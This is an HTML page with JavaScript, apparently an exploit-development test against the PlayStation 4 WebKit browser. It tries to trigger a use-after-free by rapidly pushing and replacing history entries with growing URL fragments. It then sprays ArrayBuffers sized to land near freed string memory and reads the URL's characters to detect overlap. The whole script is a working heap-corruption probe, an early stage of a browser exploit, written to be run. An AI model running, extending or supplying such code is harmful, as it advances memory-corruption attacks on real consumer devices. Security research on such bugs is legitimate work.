<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Teste H (URL ↔ ArrayBuffer Overlap)</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; }
button { font-size:16px; padding:8px; margin:5px; }
pre { white-space:pre-wrap; }
</style>
</head>
<body>

<h2>PS4 WebKit – Teste H (Read-Only Overlap)</h2>
<button onclick="runTestH()">RUN TEST H</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(s){ logEl.textContent += s + "\n"; }
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function triggerUAF(){
    log("=== UAF TRIGGER START ===");

    let size = 977;
    const STEP = 14461;

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
        if(i % 6 === 0)
            setTimeout(()=>history.back(),0);
        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");
    await sleep(120);
}

function readURLSnapshot(tag){
    let u = document.URL;
    let offs = [0, 32, 64, 128, 256, 512, 1024, 4096, 8192, 16384];
    log(`[${tag}] URL.length = ${u.length}`);
    for(let o of offs){
        if(o < u.length){
            log(`[${tag}] charCodeAt(${o}) = ${u.charCodeAt(o)}`);
        }
    }
}

async function runTestH(){
    logEl.textContent = "";
    log("=== TEST H START ===");

    await triggerUAF();

    log("\n[H] Baseline URL snapshot");
    readURLSnapshot("H-BASE");

    log("\n[H] Pivot allocations (ArrayBuffer)");

    let bufs = [];
    for(let i=0;i<64;i++){
        // tamanhos pensados para cair em buckets próximos de strings grandes
        let sz = 0x1000 + (i * 0x400);
        let ab = new ArrayBuffer(sz);
        let u8 = new Uint8Array(ab);
        bufs.push(u8);
    }

    await sleep(50);

    log("\n[H] URL snapshot after pivot");
    readURLSnapshot("H-AFTER");

    log("\n[H] history.length = " + history.length);
    log("=== TEST H END ===");
}
</script>

</body>
</html>

